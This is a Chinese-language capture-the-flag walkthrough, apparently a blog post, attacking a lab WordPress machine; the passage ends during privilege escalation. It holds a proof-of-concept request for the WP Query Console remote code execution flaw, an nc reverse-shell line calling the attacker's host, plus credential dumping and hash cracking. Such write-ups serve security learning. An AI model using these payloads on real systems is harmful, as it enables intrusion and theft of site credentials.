bammmmuwe</span><br><span class="line">|<span class="params">_http-generator:</span> WordPress <span class="number">6.7</span>.<span class="number">1</span></span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">6</span>A:<span class="number">4</span>C:<span class="number">9</span>F:<span class="number">02</span>:<span class="number">22</span>:<span class="number">6</span>E (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.05</span> ms <span class="number">192.168</span>.<span class="number">240.231</span> (<span class="number">192.168</span>.<span class="number">240.231</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">15.13</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>开放80和22 直接去web找信息</p>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>访问web端 发现这个web是用的wordpress<br><img src="https://pic1.imgdb.cn/item/67a342afd0e0a243d4fbf73c.png"><br>用wpscan 扫一下用户和插件 然后去看看有没有什么漏洞 漫长的等待~</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># wpscan --api-token r4NahZxa7hHyx6tcZVYdfivP0YNXqmTaJXwqgMatwmE --url http://192.168.240.231/ -e u,ap --plugins-detection aggressive</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        <span class="symbol">/</span> <span class="symbol">/</span>  __ \ <span class="symbol">/</span> ____|</span><br><span class="line">          \ \  <span class="operator">/</span>\  <span class="symbol">/</span> <span class="operator">/</span>| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \<span class="symbol">/</span>  \<span class="symbol">/</span> <span class="symbol">/</span> |  ___<span class="symbol">/</span> \___ \ <span class="symbol">/</span> __|<span class="symbol">/</span> _` | &#x27;_ \</span><br><span class="line">            \  <span class="operator">/</span>\  <span class="symbol">/</span>  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \<span class="symbol">/</span>  \<span class="symbol">/</span>   |_|    |_____<span class="symbol">/</span> \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version <span class="number">3.8</span>.<span class="number">27</span></span><br><span class="line">       Sponsored by Automattic <span class="operator">-</span> https:<span class="operator">//</span>automattic.com<span class="symbol">/</span></span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] <span class="params">URL:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="symbol">/</span> [<span class="number">192.168</span>.<span class="number">240.231</span>]</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Started:</span> Wed Feb  <span class="number">5</span> <span class="number">14</span>:<span class="number">57</span>:<span class="number">35</span> <span class="number">2025</span></span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] Headers</span><br><span class="line"> | Interesting <span class="params">Entry:</span> <span class="params">Server:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line"> | Found <span class="params">By:</span> Headers (Passive Detection)</span><br><span class="line"> | <span class="params">Confidence:</span> <span class="number">100</span>%</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] robots.txt <span class="params">found:</span> http:<span class="symbol">//192.168.240.231/robots.txt</span></span><br><span class="line"> | Interesting <span class="params">Entries:</span></span><br><span class="line"> |  <span class="operator">-</span> <span class="operator">/</span>wp-admin<span class="symbol">/</span></span><br><span class="line"> |  <span class="operator">-</span> <span class="symbol">/wp-admin/admin-ajax.php</span></span><br><span class="line"> | Found <span class="params">By:</span> Robots Txt (Aggressive Detection)</span><br><span class="line"> | <span class="params">Confidence:</span> <span class="number">100</span>%</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] XML-RPC seems to be <span class="params">enabled:</span> http:<span class="symbol">//192.168.240.231/xmlrpc.php</span></span><br><span class="line"> | Found <span class="params">By:</span> Direct Access (Aggressive Detection)</span><br><span class="line"> | <span class="params">Confidence:</span> <span class="number">100</span>%</span><br><span class="line"> | <span class="params">References:</span></span><br><span class="line"> |  <span class="operator">-</span> http:<span class="symbol">//codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"> |  <span class="operator">-</span> https:<span class="operator">//</span>www.rapid7.com<span class="operator">/</span>db<span class="operator">/</span>modules<span class="operator">/</span>auxiliary<span class="operator">/</span>scanner<span class="operator">/</span>http<span class="operator">/</span>wordpress_ghost_scanner<span class="symbol">/</span></span><br><span class="line"> |  <span class="operator">-</span> https:<span class="operator">//</span>www.rapid7.com<span class="operator">/</span>db<span class="operator">/</span>modules<span class="operator">/</span>auxiliary<span class="operator">/</span>dos<span class="operator">/</span>http<span class="operator">/</span>wordpress_xmlrpc_dos<span class="symbol">/</span></span><br><span class="line"> |  <span class="operator">-</span> https:<span class="operator">//</span>www.rapid7.com<span class="operator">/</span>db<span class="operator">/</span>modules<span class="operator">/</span>auxiliary<span class="operator">/</span>scanner<span class="operator">/</span>http<span class="operator">/</span>wordpress_xmlrpc_login<span class="symbol">/</span></span><br><span class="line"> |  <span class="operator">-</span> https:<span class="operator">//</span>www.rapid7.com<span class="operator">/</span>db<span class="operator">/</span>modules<span class="operator">/</span>auxiliary<span class="operator">/</span>scanner<span class="operator">/</span>http<span class="operator">/</span>wordpress_pingback_access<span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] WordPress readme <span class="params">found:</span> http:<span class="symbol">//192.168.240.231/readme.html</span></span><br><span class="line"> | Found <span class="params">By:</span> Direct Access (Aggressive Detection)</span><br><span class="line"> | <span class="params">Confidence:</span> <span class="number">100</span>%</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] The external WP-Cron seems to be <span class="params">enabled:</span> http:<span class="symbol">//192.168.240.231/wp-cron.php</span></span><br><span class="line"> | Found <span class="params">By:</span> Direct Access (Aggressive Detection)</span><br><span class="line"> | <span class="params">Confidence:</span> <span class="number">60</span>%</span><br><span class="line"> | <span class="params">References:</span></span><br><span class="line"> |  <span class="operator">-</span> https:<span class="symbol">//www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"> |  <span class="operator">-</span> https:<span class="symbol">//github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] WordPress version <span class="number">6.7</span>.<span class="number">1</span> identified (Latest, released on <span class="number">202</span>4-<span class="number">1</span>1-<span class="number">21</span>).</span><br><span class="line"> | Found <span class="params">By:</span> Meta Generator (Passive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>, <span class="params">Match:</span> &#x27;WordPress <span class="number">6.7</span>.<span class="number">1</span>&#x27;</span><br><span class="line"> | Confirmed <span class="params">By:</span> Rss Generator (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>feed<span class="operator">/</span>, <span class="symbol">&lt;generator&gt;</span>https:<span class="operator">//</span>wordpress.org<span class="operator">/</span><span class="operator">?</span>v<span class="operator">=</span><span class="number">6.7</span>.<span class="number">1</span><span class="operator">&lt;</span><span class="operator">/</span>generator<span class="operator">&gt;</span></span><br><span class="line"> |  <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>comments<span class="operator">/</span>feed<span class="operator">/</span>, <span class="symbol">&lt;generator&gt;</span>https:<span class="operator">//</span>wordpress.org<span class="operator">/</span><span class="operator">?</span>v<span class="operator">=</span><span class="number">6.7</span>.<span class="number">1</span><span class="operator">&lt;</span><span class="operator">/</span>generator<span class="operator">&gt;</span></span><br><span class="line"></span><br><span class="line">[i] The main theme could not be detected.</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] Enumerating All Plugins (via Aggressive Methods)</span><br><span class="line"> Checking Known Locations <span class="operator">-</span> <span class="params">Time:</span> <span class="number">01</span>:<span class="number">58</span>:<span class="number">02</span> <span class="operator">&lt;=</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">&gt;</span> (<span class="number">108898</span> <span class="symbol">/</span> <span class="number">108898</span>) <span class="number">100.00</span>% <span class="params">Time:</span> <span class="number">01</span>:<span class="number">58</span>:<span class="number">02</span></span><br><span class="line">[<span class="operator">+</span>] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) <span class="params">Identified:</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] akismet</span><br><span class="line"> | <span class="params">Location:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>wp-content<span class="operator">/</span>plugins<span class="operator">/</span>akismet<span class="symbol">/</span></span><br><span class="line"> | Last <span class="params">Updated:</span> <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">04</span>T21:<span class="number">01</span>:<span class="number">00.000</span>Z</span><br><span class="line"> | <span class="params">Readme:</span> http:<span class="symbol">//192.168.240.231/wp-content/plugins/akismet/readme.txt</span></span><br><span class="line"> | [<span class="operator">!</span>] The version is out of date, the latest version is <span class="number">5.3</span>.<span class="number">6</span></span><br><span class="line"> |</span><br><span class="line"> | Found <span class="params">By:</span> Known Locations (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>wp-content<span class="operator">/</span>plugins<span class="operator">/</span>akismet<span class="operator">/</span>, <span class="params">status:</span> <span class="number">200</span></span><br><span class="line"> |</span><br><span class="line"> | <span class="params">Version:</span> <span class="number">5.3</span>.<span class="number">5</span> (<span class="number">100</span>% confidence)</span><br><span class="line"> | Found <span class="params">By:</span> Readme <span class="operator">-</span> Stable Tag (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="symbol">//192.168.240.231/wp-content/plugins/akismet/readme.txt</span></span><br><span class="line"> | Confirmed <span class="params">By:</span> Readme <span class="operator">-</span> ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="symbol">//192.168.240.231/wp-content/plugins/akismet/readme.txt</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] feed</span><br><span class="line"> | <span class="params">Location:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>wp-content<span class="operator">/</span>plugins<span class="operator">/</span>feed<span class="symbol">/</span></span><br><span class="line"> |</span><br><span class="line"> | Found <span class="params">By:</span> Known Locations (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>wp-content<span class="operator">/</span>plugins<span class="operator">/</span>feed<span class="operator">/</span>, <span class="params">status:</span> <span class="number">200</span></span><br><span class="line"> |</span><br><span class="line"> | The version could not be determined.</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] wp-query-console</span><br><span class="line"> | <span class="params">Location:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>wp-content<span class="operator">/</span>plugins<span class="operator">/</span>wp-query-console<span class="symbol">/</span></span><br><span class="line"> | Latest <span class="params">Version:</span> <span class="number">1.0</span> (up to date)</span><br><span class="line"> | Last <span class="params">Updated:</span> <span class="number">201</span>8-<span class="number">0</span>3-<span class="number">16</span>T16:<span class="number">03</span>:<span class="number">00.000</span>Z</span><br><span class="line"> | <span class="params">Readme:</span> http:<span class="symbol">//192.168.240.231/wp-content/plugins/wp-query-console/README.txt</span></span><br><span class="line"> |</span><br><span class="line"> | Found <span class="params">By:</span> Known Locations (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>wp-content<span class="operator">/</span>plugins<span class="operator">/</span>wp-query-console<span class="operator">/</span>, <span class="params">status:</span> <span class="number">403</span></span><br><span class="line"> |</span><br><span class="line"> | [<span class="operator">!</span>] <span class="number">1</span> vulnerability <span class="params">identified:</span></span><br><span class="line"> |</span><br><span class="line"> | [<span class="operator">!</span>] <span class="params">Title:</span> WP Query Console <span class="operator">&lt;=</span> <span class="number">1.0</span> <span class="operator">-</span> Unauthenticated Remote Code Execution</span><br><span class="line"> |     <span class="params">References:</span></span><br><span class="line"> |      <span class="operator">-</span> https:<span class="symbol">//wpscan.com/vulnerability/f911568d-5f79-49b7-8ce4-fa0da3183214</span></span><br><span class="line"> |      <span class="operator">-</span> https:<span class="operator">//</span>cve.mitre.org<span class="operator">/</span>cgi-bin<span class="operator">/</span>cvename.cgi<span class="operator">?</span>name<span class="operator">=</span>CVE-<span class="number">202</span>4-<span class="number">50498</span></span><br><span class="line"> |      <span class="operator">-</span> https:<span class="symbol">//www.wordfence.com/threat-intel/vulnerabilities/id/ae07ca12-e827-43f9-8cbb-275b9abbd4c3</span></span><br><span class="line"> |</span><br><span class="line"> | <span class="params">Version:</span> <span class="number">1.0</span> (<span class="number">80</span>% confidence)</span><br><span class="line"> | Found <span class="params">By:</span> Readme <span class="operator">-</span> Stable Tag (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="symbol">//192.168.240.231/wp-content/plugins/wp-query-console/README.txt</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs <span class="operator">-</span> <span class="params">Time:</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">01</span> <span class="operator">&lt;=</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">&gt;</span> (<span class="number">10</span> <span class="symbol">/</span> <span class="number">10</span>) <span class="number">100.00</span>% <span class="params">Time:</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">01</span></span><br><span class="line"></span><br><span class="line">[i] User(s) <span class="params">Identified:</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] ta0</span><br><span class="line"> | Found <span class="params">By:</span> Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  <span class="operator">-</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="operator">/</span>wp-json<span class="operator">/</span>wp<span class="operator">/</span>v2<span class="operator">/</span>users<span class="operator">/</span><span class="operator">?</span>per_page<span class="operator">=</span><span class="number">100</span>&amp;page<span class="operator">=</span><span class="number">1</span></span><br><span class="line"> | Confirmed <span class="params">By:</span></span><br><span class="line"> |  Rss Generator (Aggressive Detection)</span><br><span class="line"> |  Author Id Brute Forcing <span class="operator">-</span> Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] welcome</span><br><span class="line"> | Found <span class="params">By:</span> Author Id Brute Forcing <span class="operator">-</span> Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed <span class="params">By:</span> Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] WPScan DB API OK</span><br><span class="line"> | <span class="params">Plan:</span> free</span><br><span class="line"> | Requests Done (during the scan): <span class="number">3</span></span><br><span class="line"> | Requests <span class="params">Remaining:</span> <span class="number">21</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Finished:</span> Wed Feb  <span class="number">5</span> <span class="number">16</span>:<span class="number">55</span>:<span class="number">51</span> <span class="number">2025</span></span><br><span class="line">[<span class="operator">+</span>] Requests <span class="params">Done:</span> <span class="number">108944</span></span><br><span class="line">[<span class="operator">+</span>] Cached <span class="params">Requests:</span> <span class="number">43</span></span><br><span class="line">[<span class="operator">+</span>] Data <span class="params">Sent:</span> <span class="number">29.459</span> MB</span><br><span class="line">[<span class="operator">+</span>] Data <span class="params">Received:</span> <span class="number">33.016</span> MB</span><br><span class="line">[<span class="operator">+</span>] Memory <span class="params">used:</span> <span class="number">423.633</span> MB</span><br><span class="line">[<span class="operator">+</span>] Elapsed <span class="params">time:</span> <span class="number">01</span>:<span class="number">58</span>:<span class="number">16</span></span><br></pre></td></tr></table></figure></div>
<p>足足扫了一个多小时啊  可以看到有两个用户 tao0和welcome<br>插件也扫出来三个可以利用的是wp-query-console<br>搜索一下这个插件,找到poc</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wp-json/wqc/v1/query</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>kubernetes.docker.internal</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://kubernetes.docker.internal/wp-admin/admin.php?page=wp-query-console</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>45</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://kubernetes.docker.internal</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=0</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;queryArgs&quot;</span><span class="punctuation">:</span><span class="string">&quot;phpinfo();&quot;</span><span class="punctuation">,</span><span class="attr">&quot;queryType&quot;</span><span class="punctuation">:</span><span class="string">&quot;post&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure></div>
<p>把host改一下就可以直接使用,<br><img src="https://pic1.imgdb.cn/item/67a342b0d0e0a243d4fbf73d.png"><br>可以看到ban了一些函数 但是没有ban shell_exec<br>ping本机,然后在本机测试是否shell_exec可以利用</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# tcpdump icmp </span><br><span class="line">tcpdump: verbose output suppressed, use -v[v]... <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">17:25:17.256362 IP 192.168.240.231 &gt; 192.168.240.83: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 1740, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">17:25:17.256445 IP 192.168.240.83 &gt; 192.168.240.231: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 1740, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">17:25:18.261902 IP 192.168.240.231 &gt; 192.168.240.83: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 1740, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">17:25:18.261977 IP 192.168.240.83 &gt; 192.168.240.231: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 1740, <span class="built_in">seq</span> 2, length 64</span><br></pre></td></tr></table></figure></div>
<p>反弹shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line">&quot;<span class="built_in">shell_exec</span>(&#x27;nc -e /bin/bash <span class="number">192.168</span>.<span class="number">240.83</span> <span class="number">1234</span>&#x27;);&quot;</span><br></pre></td></tr></table></figure></div>
<p>成功拿到shell</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>拿到shell之后看wordpress的配置文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@listen</span><span class="symbol">:~/html/wordpress</span><span class="variable">$ </span>cat wp-config.php</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LASSO"><figure class="iseeu highlight /lasso"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ** Database settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database username */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;ll104567&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database password */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;thehandsomeguy&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database hostname */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database charset to use in creating database tables. */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8mb4&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The database collate type. Don&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="class"><span class="keyword">define</span></span>( <span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span> );</span><br></pre></td></tr></table></figure></div>

<p>发现数据库泄露 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">MariaDB [wordpress]&gt; select <span class="symbol">*</span> from wp_users;</span><br><span class="line">+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+</span><br><span class="line">|<span class="string"> ID </span>|<span class="string"> user_login </span>|<span class="string"> user_pass                          </span>|<span class="string"> user_nicename </span>|<span class="string"> user_email        </span>|<span class="string"> user_url              </span>|<span class="string"> user_registered     </span>|<span class="string"> user_activation_key                           </span>|<span class="string"> user_status </span>|<span class="string"> display_name </span>|</span><br><span class="line">+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+</span><br><span class="line">|<span class="string">  1 </span>|<span class="string"> ta0        </span>|<span class="string"> $P$BDDc71nM67DbOVN/U50WFGII6EF6.r. </span>|<span class="string"> ta0           </span>|<span class="string"> 2814928906@qq.com </span>|<span class="string"> http://192.168.31.181 </span>|<span class="string"> 2025-01-08 03:10:43 </span>|<span class="string">                                               </span>|<span class="string">           0 </span>|<span class="string"> ta0          </span>|</span><br><span class="line">|<span class="string">  2 </span>|<span class="string"> welcome    </span>|<span class="string"> $P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/ </span>|<span class="string"> welcome       </span>|<span class="string"> 127.0.0.1@qq.com  </span>|<span class="string">                       </span>|<span class="string"> 2025-01-08 04:29:28 </span>|<span class="string"> 1736310568:$P$B2YbhlDVF1XWIurbL11Pfoasb./0tD. </span>|<span class="string">           0 </span>|<span class="string"> welcome      </span>|</span><br><span class="line">+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+</span><br><span class="line">2 rows in set (0.014 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [wordpress]&gt; </span><br></pre></td></tr></table></figure></div>

<p>得到两个用户名和密码,然后用john可以跑出来welcome的密码,接下来就切换到welcome用户操作</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># john tmp                                                                             </span></span><br><span class="line">Using default input <span class="params">encoding:</span> UTF-<span class="number">8</span></span><br><span class="line">Loaded <span class="number">1</span> password hash (phpass [phpass ($P$ <span class="keyword">or</span> $H$) <span class="number">128</span><span class="symbol">/128</span> ASIMD <span class="number">4</span>x2])</span><br><span class="line">Cost <span class="number">1</span> (iteration count) is <span class="number">8192</span> for all loaded hashes</span><br><span class="line">Will run <span class="number">2</span> OpenMP threads</span><br><span class="line">Proceeding <span class="keyword">with</span> single, rules:Single</span><br><span class="line">Press &#x27;q&#x27; <span class="keyword">or</span> Ctrl-C to <span class="built_in">abort</span>, almost any other key for status</span><br><span class="line">Almost <span class="params">done:</span> Processing the remaining buffered candidate passwords, <span class="keyword">if</span> any.</span><br><span class="line">Proceeding <span class="keyword">with</span> wordlist:<span class="symbol">/usr/share/john/password.lst</span></span><br><span class="line">Proceeding <span class="keyword">with</span> incremental:ASCII</span><br><span class="line"><span class="number">104567</span>           (<span class="operator">?</span>)     </span><br><span class="line"><span class="number">1</span>g <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">22</span> DONE <span class="number">3</span><span class="symbol">/3</span> (<span class="number">202</span>5-<span class="number">0</span>2-<span class="number">05</span> <span class="number">18</span>:<span class="number">05</span>) <span class="number">0.04403</span>g<span class="symbol">/s</span> <span class="number">8169</span>p<span class="symbol">/s</span> <span class="number">8169</span>c<span class="symbol">/s</span> <span class="number">8169</span>C<span class="symbol">/s</span> milling1..<span class="number">192011</span></span><br><span class="line">Use the <span class="string">&quot;--show --format=phpass&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure></div>
<p>有一个gobuster的sudo权限</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> welcome on <span class="symbol">listen:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> welcome may run the following commands on <span class="symbol">listen:</span></span><br><span class="line">    (<span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/bin/gobuster</span><br></pre></td></tr></table></figure></div>
<p>现在需要我们用一个pspy64程序看定时任务 下载地址在<br><code>https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64</code></p>
